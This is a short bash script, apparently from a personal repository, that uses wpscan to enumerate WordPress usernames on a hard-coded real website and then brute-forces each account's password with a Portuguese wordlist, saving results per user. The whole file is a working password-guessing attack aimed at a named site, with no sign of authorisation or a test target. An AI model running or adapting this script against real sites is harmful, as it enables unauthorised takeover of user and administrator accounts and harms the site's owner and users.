#!/bin/bash

# Author: meepmaster
# Date: 06-04-2024
# Description: WPSCAN SCRIPT SIMPLE



# Perform user enumeration

function user_enumeration() {
    echo "Performing user enumeration..."
    # Run wpscan and redirect output to a temporary file
    wpscan --url https://www.evasoes.pt/ --enumerate u > user_enum_tmp.txt
    
    # Check if the wpscan command was successful
    if [ $? -eq 0 ]; then
        # Extract usernames from the user enumeration result
        USERLIST=$(grep '[+]' user_enum_tmp.txt | awk '{print $2}')
        
        # Check if any usernames were found
        if [ -n "$USERLIST" ]; then
            echo "User enumeration successful. Usernames: $USERLIST"
            # Move the temporary file to user_enum.txt
            mv user_enum_tmp.txt user_enum.txt
        else
            echo "No usernames found in the enumeration result."
            rm user_enum_tmp.txt  # Remove the temporary file
        fi
    else
        echo "Error: Failed to run wpscan."
        rm user_enum_tmp.txt  # Remove the temporary file
    fi
}



# Perform brute force attack for each username

function force_brute () {
        for USERNAME in $USERLIST; do
        echo "Performing brute force attack for user: $USERNAME..."
        wpscan --url https://www.evasoes.pt/  --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME"  --output "brute_force_result_$USERNAME.txt"
    done
}

# Call Functions

user_enumeration
force_brute

# End of Script